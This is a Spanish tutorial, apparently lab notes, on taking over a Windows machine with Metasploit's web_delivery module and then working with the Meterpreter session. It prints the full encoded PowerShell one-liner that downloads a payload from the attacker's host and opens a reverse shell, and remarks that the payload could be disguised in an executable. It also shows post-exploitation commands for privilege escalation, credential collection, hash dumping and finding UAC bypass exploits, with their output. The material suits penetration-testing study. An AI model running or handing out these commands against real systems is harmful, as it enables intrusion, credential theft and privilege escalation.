# Windows (Meterpreter para Post-Explotación)

Para comprometer la maquina `Windows` vamos a utilizar un modulo `exploit` de `metasploit` llamado `Web Delivery`:

```shell
msfconsole -q
```

```shell
use exploit/multi/script/web_delivery
```

Lo que va hacer este `exploit` es que va a generar de forma automatica un `payload` el cual tendremos que ejecutar en la maquina `Windows` como si fueramos un usuario normal.

Por lo que vamos a especificar el `target` haciendo un `show targets` y elgiendo, en mi caso utilizare el numero `2` que seria el `powershell`.

```shell
set target 2
```

Tambien vamos a especificarle el `payload` ya que el que viene por defecto no creo que funcione:

```shell
set payload windows/x64/meterpreter/reverse_tcp
```

Y ya especificar la demas configuracion importante:

```shell
set LHOST <IP>
```

Y con esto ya ejecutamos el `exploit`:

```shell
exploit
```

Info:

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.16.139:4444 
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://192.168.16.139:8080/iPVFEviYOocLC
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHQARQByAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGkAdABFAHIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABpAHQARQByAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEANgAuADEAMwA5ADoAOAAwADgAMAAvAGkAUABWAEYARQB2AGkAWQBPAG8AYwBMAEMALwB1AGUAMABMAGoAWQBTAEEARgBOAGkASgBiAHUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADYALgAxADMAOQA6ADgAMAA4ADAALwBpAFAAVgBGAEUAdgBpAFkATwBvAGMATABDACcAKQApADsA
```

Lo que nos esta especificando aqui es que con ese `payload` obtendremos una conexion reversa si se ejecuta en la maquina `Windows`, por lo que esto se podria camuflar meidante un ejecutable o cualquier cosa, pero para no perder tiempo lo ejecutaremos a pelo en el `pwershell` en `Windows`:

```powershell
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAHQARQByAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGkAdABFAHIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABpAHQARQByAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEANgAuADEAMwA5ADoAOAAwADgAMAAvAGkAUABWAEYARQB2AGkAWQBPAG8AYwBMAEMALwB1AGUAMABMAGoAWQBTAEEARgBOAGkASgBiAHUAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxADYALgAxADMAOQA6ADgAMAA4ADAALwBpAFAAVgBGAEUAdgBpAFkATwBvAGMATABDACcAKQApADsA
```

Una vez ejecutado, si nos vamos al `kali` podremos ver que obtendremos una `reverse shell` con `meterpreter`.

```
[*] 192.168.16.138   web_delivery - Delivering AMSI Bypass (1391 bytes)
[*] 192.168.16.138   web_delivery - Delivering Payload (3714 bytes)
[*] Sending stage (201798 bytes) to 192.168.16.138
[*] Meterpreter session 1 opened (192.168.16.139:4444 -> 192.168.16.138:49799) at 2024-11-21 06:06:49 -0500
```

Le daremos a `ENTER` y si ponemos `sessions` podremos ver la sesion:

```
Active sessions
===============

  Id  Name  Type                     Information                              Connection
  --  ----  ----                     -----------                              ----------
  1         meterpreter x64/windows  DESKTOP-EALA4JN\d1se0 @ DESKTOP-EALA4JN  192.168.16.139:4444 -> 192.168.16.138:49799 (192.168.16.138)
```

Por lo que entraremos en ella poniendo `sessions 1`.

Si hacemos `getuid` veremos que somos un usuario normal:

```
Server username: DESKTOP-EALA4JN\d1se0
```

Una tecnica bastante sencilla que esta dedicada a cuando comprometes una maquina `windows` que ya viene en `meterpreter` por defecto para escalar privilegios en `windows` es con el siguiente comando:

```shell
getsystem
```

Lo que va a intentar hacer es elevar privilegios con diferentes tecnicas.

Y si esto funcionara, veremos lo siguiente:

```
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

Si hacemos un `getuid` veremos:

```
Server username: NT AUTHORITY\SYSTEM
```

Pero pongamosle que esto no funciona, podremos hacer lo siguiente:

Si nosotros intentamos ejecutar un modulo para intentar recopilar credenciales:

```
run post/windows/gather/credentials/credential_collector
```

Info:

```
[*] Running module against DESKTOP-EALA4JN
[-] Error accessing hashes, did you migrate to a process that matched the target's architecture?
```

Veremos que no nos deja, pero podremos seguir intentando unos cuantos que se suelen utilizar.

Por ejemplo para enumerar las carpetas compartidas del sistema:

```shell
run post/windows/gather/enum_shares
```

Info:

```
[*] Running module against DESKTOP-EALA4JN (192.168.16.138)
[*] The following shares were found:
[*]     Name: Users
[*]     Path: C:\Users
[*]     Type: DISK
[*] 
[*]     Name: Share
[*]     Path: C:\Users\d1se0\Desktop\Share
[*]     Type: DISK
```

Aqui vemos que hay una carpeta llamada `Share` que se esta compartiendo.

Tambien para intentar volcar los hashes:

```shell
run post/windows/gather/hashdump
```

Info:

```
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 9cf44a88bb026bed7b64c16915466195...
[-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied.
[-] This script requires the use of a SYSTEM user context (hint: migrate into service process)
```

Pero en este caso tambien nos dara error.

Vamos a intentar conseguir permisos de administrador, de la siguiente forma, vamos a mandar esta sesion en segundo plano con el coamndo `background` y nos iremos atras con `back`.

Seleccionaremos el `exploit` que te recomienda `exploits` de los cuales pueden ser vulnerable la maquina `windows`.

```shell
use post/multi/recon/local_exploit_suggester
```

```shell
set session 1
exploit
```

Info:

```
[*] 192.168.16.138 - Collecting local exploits for x64/windows...
[*] 192.168.16.138 - 196 exploit checks are being tried...
[+] 192.168.16.138 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.16.138 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 192.168.16.138 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.16.138 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.16.138 - exploit/windows/local/win_error_cve_2023_36874: The target appears to be vulnerable.

[*] 192.168.16.138 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/win_error_cve_2023_36874                 Yes                      The target appears to be vulnerable.
```

Por lo que vemos es vulnerable a `bypassuac` que es cuando intentas ejecutar algo como administrador y te aparece la ventana de si realmente quieres ejecutar o acceder a ello como metodo de seguridad a esto se le llama el `UAC (User Account Control)` y tiene la vulnerabilidad de hacerle un `Bypass`.

Y ya con esto podremos aprovechar algunas de estas vulnerabilidades para escalar privilegios.
